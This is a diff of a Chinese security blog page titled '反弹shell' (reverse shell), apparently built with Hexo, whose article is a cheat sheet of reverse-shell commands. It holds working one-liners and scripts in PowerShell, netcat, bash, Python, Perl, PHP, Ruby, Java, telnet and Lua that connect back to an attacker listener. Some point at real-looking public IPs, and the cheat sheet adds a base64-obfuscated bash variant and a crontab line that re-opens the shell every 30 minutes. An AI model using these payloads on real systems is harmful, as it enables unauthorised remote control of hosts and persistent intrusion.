@@ -8,18 +8,18 @@
   <link rel="dns-prefetch" href="http://yoursite.com">
   <title>反弹shell | cruoni的博客</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="当你找到一个有命令执行的主机时，你可能想要一个交互式的shell，如果你不能添加用户或者添加ssh密钥时，你就需要反弹一个shell来实现，下面的都是反弹shell的命令  1. PowerShell123456本地：nc -lv 8888目标：powershell -w hidden -nop -c function RSC&amp;#123;if ($c.Connected -eq $true) &amp;#">
+  <meta name="description" content="[toc]当你找到一个有命令执行的主机时，你可能想要一个交互式的shell，如果你不能添加用户或者添加ssh密钥时，你就需要反弹一个shell来实现，下面的都是反弹shell的命令  1. PowerShell123456本地：nc -lv 8888目标：powershell -w hidden -nop -c function RSC&amp;#123;if ($c.Connected -eq $tru">
 <meta name="keywords" content="反弹shell">
 <meta property="og:type" content="article">
 <meta property="og:title" content="反弹shell">
 <meta property="og:url" content="http://yoursite.com/2020/10/24/反弹shell/index.html">
 <meta property="og:site_name" content="cruoni的博客">
-<meta property="og:description" content="当你找到一个有命令执行的主机时，你可能想要一个交互式的shell，如果你不能添加用户或者添加ssh密钥时，你就需要反弹一个shell来实现，下面的都是反弹shell的命令  1. PowerShell123456本地：nc -lv 8888目标：powershell -w hidden -nop -c function RSC&amp;#123;if ($c.Connected -eq $true) &amp;#">
+<meta property="og:description" content="[toc]当你找到一个有命令执行的主机时，你可能想要一个交互式的shell，如果你不能添加用户或者添加ssh密钥时，你就需要反弹一个shell来实现，下面的都是反弹shell的命令  1. PowerShell123456本地：nc -lv 8888目标：powershell -w hidden -nop -c function RSC&amp;#123;if ($c.Connected -eq $tru">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2020-10-24T09:23:45.953Z">
+<meta property="og:updated_time" content="2021-02-09T02:30:51.505Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="反弹shell">
-<meta name="twitter:description" content="当你找到一个有命令执行的主机时，你可能想要一个交互式的shell，如果你不能添加用户或者添加ssh密钥时，你就需要反弹一个shell来实现，下面的都是反弹shell的命令  1. PowerShell123456本地：nc -lv 8888目标：powershell -w hidden -nop -c function RSC&amp;#123;if ($c.Connected -eq $true) &amp;#">
+<meta name="twitter:description" content="[toc]当你找到一个有命令执行的主机时，你可能想要一个交互式的shell，如果你不能添加用户或者添加ssh密钥时，你就需要反弹一个shell来实现，下面的都是反弹shell的命令  1. PowerShell123456本地：nc -lv 8888目标：powershell -w hidden -nop -c function RSC&amp;#123;if ($c.Connected -eq $tru">
   
     <link rel="alternative" href="/atom.xml" title="cruoni的博客" type="application/atom+xml">
   
@@ -165,17 +165,26 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>当你找到一个有命令执行的主机时，你可能想要一个交互式的shell，如果你不能添加用户或者添加ssh密钥时，你就需要反弹一个shell来实现，下面的都是反弹shell的命令</p>
+        <p>[toc]<br>当你找到一个有命令执行的主机时，你可能想要一个交互式的shell，如果你不能添加用户或者添加ssh密钥时，你就需要反弹一个shell来实现，下面的都是反弹shell的命令</p>
 <hr>
 <h2><span id="1-powershell">1. PowerShell</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">本地：</span><br><span class="line">nc -lv 8888</span><br><span class="line"></span><br><span class="line">目标：</span><br><span class="line"></span><br><span class="line">powershell -w hidden -nop -c function RSC&#123;if ($c.Connected -eq $true) &#123;$c.Close()&#125;;if ($p.ExitCode -ne $null) &#123;$p.Close()&#125;;exit;&#125;;$a=&apos;10.10.10.10&apos;;$p=&apos;8888&apos;;$c=New-Object system.net.sockets.tcpclient;$c.connect($a,$p);$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize;$p=New-Object System.Diagnostics.Process;$p.StartInfo.FileName=&apos;cmd.exe&apos;;$p.StartInfo.RedirectStandardInput=1;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.UseShellExecute=0;$p.Start();$is=$p.StandardInput;$os=$p.StandardOutput;Start-Sleep 1;$e=new-object System.Text.AsciiEncoding;while($os.Peek() -ne -1)&#123;$o += $e.GetString($os.Read())&#125;;$s.Write($e.GetBytes($o),0,$o.Length);$o=$null;$d=$false;$t=0;while (-not $d) &#123;if ($c.Connected -ne $true) &#123;RSC&#125;;$pos=0;$i=1; while (($i -gt 0) -and ($pos -lt $nb.Length)) &#123;$r=$s.Read($nb,$pos,$nb.Length - $pos);$pos+=$r;if (-not $pos -or $pos -eq 0) &#123;RSC&#125;;if ($nb[0..$($pos-1)] -contains 10) &#123;break&#125;&#125;;if ($pos -gt 0)&#123;$str=$e.GetString($nb,0,$pos);$is.write($str);start-sleep 1;if ($p.ExitCode -ne $null)&#123;RSC&#125;else&#123;$o=$e.GetString($os.Read());while($os.Peek() -ne -1)&#123;$o += $e.GetString($os.Read());if ($o -eq $str) &#123;$o=&apos;&apos;&#125;&#125;;$s.Write($e.GetBytes($o),0,$o.length);$o=$null;$str=$null&#125;&#125;else&#123;RSC&#125;&#125;;</span><br></pre></td></tr></table></figure>
 <h2><span id="2-netcat">2. Netcat</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">公网：nc -lv 8888</span><br><span class="line">目标：nc -e cmd.exe 10.10.10.10 8888 #nc -e /bin/sh 10.10.10.10 8888</span><br><span class="line"></span><br><span class="line">#获得交互式的shell：</span><br><span class="line">在得到shell后执行：python -c &quot;import pty; pty.spawn(&apos;/bin/bash&apos;)&quot;</span><br></pre></td></tr></table></figure>
 <h2><span id="3-bash">3. Bash</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/10.10.10.10/8888 0&gt;&amp;1</span><br><span class="line">注：这个由解析shell的bash完成，有些时候不支持</span><br><span class="line"></span><br><span class="line">reber@wyb:~$ cat tmp.txt </span><br><span class="line">L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzExNC4xMTUuMTgzLjg2LzY2NjYgMD4mMQ==</span><br><span class="line">reber@wyb:~$ cat tmp.txt |base64 -d</span><br><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/114.115.183.86/6666 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">reber@wyb:~$ &#123;cat,tmp.txt&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure>
 <h2><span id="4-crontab">4. crontab</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">下面这条命令执行后会每隔30分钟反弹一次：</span><br><span class="line">(crontab -l;printf &quot;*/30 * * * * exec 9&lt;&gt; /dev/tcp/10.10.10.10/8888;exec 0&lt;&amp;9;</span><br><span class="line">exec 1&gt;&amp;9 2&gt;&amp;1;/bin/bash --noprofile -i;\rno crontab for `whoami`%100c\n&quot;)|</span><br><span class="line">crontab -</span><br></pre></td></tr></table></figure>
 <h2><span id="5-python">5. Python</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,</span><br><span class="line">socket.SOCK_STREAM);s.connect((&quot;10.10.10.10&quot;,8888));os.dup2(s.fileno(),0); </span><br><span class="line">os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;</span><br></pre></td></tr></table></figure>
-<h2><span id="perl">Perl</span></h2><figure class="highlight perl"><figcaption><span>-e 'use Socket;$i</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">getprotobyname</span>(<span class="string">"tcp"</span>));<span class="keyword">if</span>(<span class="keyword">connect</span>(S,sockaddr_in($p,inet_aton($i))))&#123;<span class="keyword">open</span>(STDIN,</span><br><span class="line"><span class="string">"&gt;&amp;S"</span>);<span class="keyword">open</span>(STDOUT,<span class="string">"&gt;&amp;S"</span>);<span class="keyword">open</span>(STDERR,<span class="string">"&gt;&amp;S"</span>);<span class="keyword">exec</span>(<span class="string">"/bin/sh -i"</span>);&#125;;<span class="string">'</span></span><br><span class="line"><span class="string">0x06 PHP</span></span><br><span class="line"><span class="string">php -r '</span>$sock=fsockopen(<span class="string">"10.10.10.10"</span>,<span class="number">8888</span>);<span class="keyword">exec</span>(<span class="string">"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3"</span>);<span class="string">'</span></span><br></pre></td></tr></table></figure>
-<h2><span id="ruby">Ruby</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e&apos;f=TCPSocket.open(&quot;10.10.10.10&quot;,8888).to_i;</span><br><span class="line">exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&apos;</span><br></pre></td></tr></table></figure>
+<h2><span id="perl">Perl</span></h2><figure class="highlight perl"><figcaption><span>-e 'use Socket;$i</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">getprotobyname</span>(<span class="string">"tcp"</span>));<span class="keyword">if</span>(<span class="keyword">connect</span>(S,sockaddr_in($p,inet_aton($i))))&#123;<span class="keyword">open</span>(STDIN,</span><br><span class="line"><span class="string">"&gt;&amp;S"</span>);<span class="keyword">open</span>(STDOUT,<span class="string">"&gt;&amp;S"</span>);<span class="keyword">open</span>(STDERR,<span class="string">"&gt;&amp;S"</span>);<span class="keyword">exec</span>(<span class="string">"/bin/sh -i"</span>);&#125;;<span class="string">'</span></span><br></pre></td></tr></table></figure>
+<h2><span id="php">PHP</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &apos;$sock=fsockopen(&quot;10.10.10.10&quot;,8888);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$ip = ;</span><br><span class="line">$port = ;</span><br><span class="line">$sock = fsockopen($ip, $port);</span><br><span class="line">$descriptorspec = array(</span><br><span class="line">        0 =&gt; $sock,</span><br><span class="line">        1 =&gt; $sock,</span><br><span class="line">        2 =&gt; $sock</span><br><span class="line">);</span><br><span class="line">$process = proc_open(&apos;/bin/sh&apos;, $descriptorspec, $pipes);</span><br><span class="line">proc_close($process);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h2><span id="ruby">Ruby</span></h2><ol>
+<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e&apos;f=TCPSocket.open(&quot;x.x.x.x&quot;,5555).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&apos;</span><br></pre></td></tr></table></figure>
+</li>
+<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e &apos;exit if fork;c=TCPSocket.new(&quot;x.x.x.x&quot;,&quot;5555&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&apos;</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
 <h2><span id="java">Java</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/10.10.10.10/8888;cat &lt;&amp;5 | </span><br><span class="line">while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])</span><br><span class="line">p.waitFor()</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">public class Revs &#123;</span><br><span class="line">/**</span><br><span class="line">* @param args</span><br><span class="line">* @throws Exception </span><br><span class="line">*/</span><br><span class="line">public static void main(String[] args) throws Exception &#123;</span><br><span class="line">    // TODO Auto-generated method stub</span><br><span class="line">    Runtime r = Runtime.getRuntime();</span><br><span class="line">    String cmd[]= &#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/x.x.x.x/5555;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;&#125;;</span><br><span class="line">    Process p = r.exec(cmd);</span><br><span class="line">    p.waitFor();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <h2><span id="telnet">telnet</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">两种方法：</span><br><span class="line">mknod backpipe p &amp;&amp; telnet 173.214.173.151 8080 0backpipe</span><br><span class="line">telnet 173.214.173.151 8080 | /bin/bash | telnet 173.214.173.151 8888</span><br><span class="line">第一种hacker运行：nc -vlp 8080</span><br><span class="line">第二种hacker运行：nc -vlp 8080和nc -vlp 8888</span><br></pre></td></tr></table></figure>
+<h2><span id="lua">lua</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lua -e &quot;require(&apos;socket&apos;);require(&apos;os&apos;);t=socket.tcp();t:connect(&apos;x.x.x.x&apos;,&apos;5555&apos;);os.execute(&apos;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&apos;);&quot;</span><br></pre></td></tr></table></figure>
       
 
       
@@ -279,6 +288,15 @@
   
 <nav id="article-nav">
   
+    <a href="/2020/10/26/-wooyun-深入了解SQL注入绕过waf和过滤机制/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          [wooyun]深入了解SQL注入绕过waf和过滤机制
+        
+      </div>
+    </a>
+  
   
     <a href="/2020/10/21/从HTTP协议层面探讨Bypass-WAF/" id="article-nav-older" class="article-nav-link-wrap">
       <div class="article-nav-title">从HTTP协议层面探讨Bypass WAF</div>
@@ -324,7 +342,7 @@
   <div class="outer">
     <div id="footer-info">
     	<div class="footer-left">
-    		&copy; 2020 cruoni
+    		&copy; 2021 cruoni
     	</div>
       	<div class="footer-right">
       		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
@@ -407,10 +425,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">bypass</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">ctf</a>
               </li>
              
@@ -423,15 +437,19 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">漏洞复现</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">python</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">工具</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">nmap</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">漏洞复现</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -443,15 +461,19 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">文件上传</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">xss</a>
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">文件上传</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">渗透</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">bypass</a>
               </li>
              
               <li class="article-tag-list-item">
